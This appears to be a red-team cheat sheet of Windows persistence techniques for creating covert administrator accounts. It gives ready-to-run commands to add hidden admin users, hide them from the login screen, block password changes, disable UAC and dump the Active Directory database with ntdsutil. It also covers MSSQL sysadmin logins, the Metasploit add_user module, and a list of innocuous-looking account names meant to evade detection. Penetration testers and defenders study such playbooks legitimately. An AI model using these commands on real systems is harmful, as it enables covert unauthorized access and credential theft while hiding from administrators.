# Create User

Normally you wouldn't create an account since it is intrusive but hackers had to avoid writing malware on disk as much as possible. Choose your decisions wisely.

## 01 - Command Prompt

```
C:\> net user sysadmin s3cur3d+1T /add /y

C:\> net localgroup Administrators sysadmin /add /y
```

Makes the user account invisible from the Windows Login screen

`C:\> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v sysadmin /t REG_DWORD /d 0 /f`

Sometimes it's a bit annoying when losing access that somebody changed the password whatever if it's on purpose or accidental. This `/passwordchg:<YES | NO>` option will prevent it from happening.

`C:\> net user sysadmin /passwordchg:no`

Never expire the password (this command is intrusive so be careful)

`C:\> net accounts /maxpwage:unlimited`

Install From Media (IFM)

`C:\> ntdsutil.exe "activate instance ntds" "ifm" "create full c:\temp" quit quit`

`C:\> ntdsutil.exe "ac in ntds" "ifm" "cr fu c:\temp" q q`

Persistence method to add user account

`C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v MS_BACKUP /t REG_DWORD /d 0 /f`

Disabling UAC that allows the hacker to take full control

`C:\> reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f`

Enabling UAC to make the admin restrictive

`C:\> reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f`

## 02 - Powershell

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
New-LocalUser -Name sysadmin -Password $password
Add-LocalGroupMember -Groups Administrators -Member "sysadmin"
```

## 03 - MSSQL

```
$ sqsh -S <IP> -U <username> -P "<password>"
 
1> CREATE LOGIN <username> WITH PASSWORD = '<password>';
2> sp_addsrvrolemember '<username>', 'sysadmin';
3> go
```

## 04 - Metasploit

### 4.1 - Modules

#### 4.1.1 - Post

```
msf post(windows/manage/add_user) > options

Module options (post/windows/manage/add_user):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   ADDTODOMAIN  true             yes       Add to Domain if true, otherwise add locally
   ADDTOGROUP   false            yes       Add group if it does not exist
   GROUP                         no        Add user into group, creating it if necessary
   PASSWORD                      no        Password of the user
   SESSION                       yes       The session to run this module on.
   TOKEN                         no        Username or PID of the token which will be used (if blank, Domain Admin tokens will be enumerated)
   USERNAME                      yes       The username of the user to add (not-qualified, e.g. BOB)

msf post(windows/manage/add_user) > set username sysadmin

msf post(windows/manage/add_user) > set password s3cUrePassw0rd!

msf post(windows/manage/add_user) > set addtodomain false

msf post(windows/manage/add_user) > set addtogroup true

msf post(windows/manage/add_user) > set group administrators

msf post(windows/manage/add_user) > set session <number>

msf post(windows/manage/add_user) > run
```

### 4.2 - Meterpreter

#### 4.2.1 - Incognito

TODO: Fill this info

## 05 - User Accounts Examples

Here are the usernames that you can think of to create an account but be sure to come up your own to make it less obvious

```
service
windows
user
help
guest
assistant
HelpAssistant
admin
admin1
admin2
sysadmin
localadmin
MS_BACKUP
sqlbackup
loginid
oldadministrator
```

## References

- [Hacktricks: Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

- [Zweilosec: Windows RedTeam Persistence](https://zweilosec.gitbook.io/hackers-rest/windows-1/windows-redteam/persistence)

- [Persistence Info](https://persistence-info.github.io/)